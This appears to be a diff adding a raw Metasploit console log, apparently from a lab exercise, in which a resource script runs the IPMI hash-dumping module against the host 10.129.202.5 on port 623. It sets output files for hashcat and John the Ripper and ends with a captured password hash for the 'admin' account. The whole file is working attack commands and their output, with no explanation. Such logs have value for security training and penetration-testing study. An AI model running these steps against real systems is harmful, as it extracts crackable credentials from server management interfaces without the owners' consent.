@@ -1,0 +1,20 @@
+[1m[34m[*][0m Processing /tmp/ipmi_r4fu7gxm.rc for ERB directives.
+resource (/tmp/ipmi_r4fu7gxm.rc)> use auxiliary/scanner/ipmi/ipmi_dumphashes
+[0mresource (/tmp/ipmi_r4fu7gxm.rc)> set RHOSTS 10.129.202.5
+[0mRHOSTS => 10.129.202.5
+resource (/tmp/ipmi_r4fu7gxm.rc)> set RPORT 623
+[0mRPORT => 623
+resource (/tmp/ipmi_r4fu7gxm.rc)> set CRACK_COMMON true
+[0mCRACK_COMMON => true
+resource (/tmp/ipmi_r4fu7gxm.rc)> set THREADS 1
+[0mTHREADS => 1
+resource (/tmp/ipmi_r4fu7gxm.rc)> set OUTPUT_HASHCAT_FILE output/ipmi/10.129.202.5/hashes/ipmi_hashcat.txt
+[0mOUTPUT_HASHCAT_FILE => output/ipmi/10.129.202.5/hashes/ipmi_hashcat.txt
+resource (/tmp/ipmi_r4fu7gxm.rc)> set OUTPUT_JOHN_FILE output/ipmi/10.129.202.5/hashes/ipmi_john.txt
+[0mOUTPUT_JOHN_FILE => output/ipmi/10.129.202.5/hashes/ipmi_john.txt
+resource (/tmp/ipmi_r4fu7gxm.rc)> run
+[0m[1m[32m[+][0m 10.129.202.5:623 - IPMI - Hash found: admin:eec099cc820c00005139dc6957c8df95213bd38923f84046867e91d697651930390e9834d3d10edca123456789abcdefa123456789abcdef140561646d696e:425bb4a259c89378538af1ad3ef34f75bfbabc45
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+resource (/tmp/ipmi_r4fu7gxm.rc)> exit -y
+[0m
